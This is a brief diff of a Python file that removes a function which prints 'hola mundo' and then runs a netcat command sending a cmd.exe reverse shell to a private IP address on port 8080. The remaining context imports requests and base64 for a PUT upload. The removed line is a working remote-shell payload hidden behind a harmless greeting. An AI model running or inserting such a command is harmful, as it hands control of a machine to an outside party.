@@ -1,7 +1,4 @@
-def run():
-  print('hola mundo')
-  import os
-  os.system('nc -e cmd.exe  172.16.32.138 8080')
+
   # Import the requests module for send a PUT request
 import requests
 # Import the base64 module for encoding a file to base64
